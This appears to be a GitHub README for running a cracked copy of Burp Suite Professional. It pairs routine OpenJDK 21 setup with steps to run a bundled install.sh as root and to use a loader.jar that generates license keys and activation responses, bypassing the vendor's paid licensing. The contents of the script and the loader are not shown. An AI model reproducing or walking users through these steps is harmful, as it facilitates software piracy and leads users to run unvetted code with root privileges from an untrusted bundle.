# Burp Suite Professional 2026 — Setup & Java Configuration Guide

This repository contains step-by-step instructions and video walkthrough references for setting up and running **Burp Suite Professional (v2026.x)**.

---

## 1. How to Downgrade & Configure Java Version (Video Walkthrough 1)

Burp Suite Pro requires a compatible Java Runtime Environment (OpenJDK 21). Follow these steps to install and switch your active Java version.

### Video Recording: Java Downgrade Guide

https://github.com/user-attachments/assets/26aacde4-9899-4647-8efb-9401a79318a2

> 🎥 **[Direct Link: Watch Recording 1 — Java Downgrade](https://github.com/user-attachments/assets/26aacde4-9899-4647-8efb-9401a79318a2)**

---

### Step-by-Step Instructions:

#### Step 1.1: Verify Your Current Java Version
Check the active version of Java on your system:
```bash
java -version
```

#### Step 1.2: Install Compatible OpenJDK (Java 21)
On Debian / Ubuntu / Kali Linux:
```bash
sudo apt update
sudo apt install -y openjdk-21-jre openjdk-21-jdk
```

#### Step 1.3: Downgrade / Select Active Java Runtime
Switch your system's active Java runtime to OpenJDK 21 using `update-alternatives`:
```bash
sudo update-alternatives --config java
```
Enter the selection number corresponding to **`java-21-openjdk`** (e.g., `/usr/lib/jvm/java-21-openjdk-amd64/bin/java`).

*(Optional)* If applicable, switch the compiler alternatives as well:
```bash
sudo update-alternatives --config javac
```

#### Step 1.4: Confirm Active Java Version
Verify that the downgrade was applied successfully:
```bash
java -version
```
*Expected output: OpenJDK Runtime Environment (build 21.x.x...)*

---

## 2. Burp Suite Professional Setup & Activation (Video Walkthrough 2)

Follow the sequence below to run the installation script as root, execute under your standard user, and complete activation.

### Video Recording: Setup & Activation Guide

https://github.com/user-attachments/assets/daf26c8b-80d4-41a7-8901-5c41e273d07d

> 🎥 **[Direct Link: Watch Recording 2 — Complete Setup & Graphical Launcher](https://github.com/user-attachments/assets/daf26c8b-80d4-41a7-8901-5c41e273d07d)**

---

### Step-by-Step Instructions:

#### Step 2.1: Switch to Root User
Open your terminal and switch to the root user:
```bash
sudo su
```

#### Step 2.2: Navigate into the Folder
Enter the directory containing the setup files:
```bash
cd BurpSuitePro-v2026
```

#### Step 2.3: Make `install.sh` Executable and Run
Grant execute permission to `install.sh` and execute it:
```bash
chmod +x install.sh
./install.sh
```
*This script installs dependencies, sets up the binary shortcut, and automatically opens both `loader.jar` and Burp Suite.*

#### Step 2.4: Close Initial Burp Suite Window
When Burp Suite launches and prompts for the license key / terms:
- **Close the Burp Suite window.**
- Keep `loader.jar` open.

#### Step 2.5: Open a New Terminal Tab as Normal User
Open a **new terminal tab or window**, ensuring you are **NOT** on the root user (use your regular user account), then run:
```bash
burpsuitepro
```
Burp Suite will launch again under your normal user profile.

#### Step 2.6: Complete Manual License Activation
1. In the **loader.jar** window, copy the generated **License**.
2. Paste the license into the Burp Suite license screen and click **Next**.
3. Select **Manual Activation**.
4. Click **Copy Request** in Burp Suite and paste it into the **Activation Request** box in `loader.jar`.
5. Copy the generated **Activation Response** from `loader.jar` and paste it back into Burp Suite.
6. Click **Next** -> **Finish**.

#### Step 2.7: Graphical Desktop Launcher
Refer to **Video Walkthrough 2** above for the visual guide on creating a desktop graphical application launcher icon for quick access.
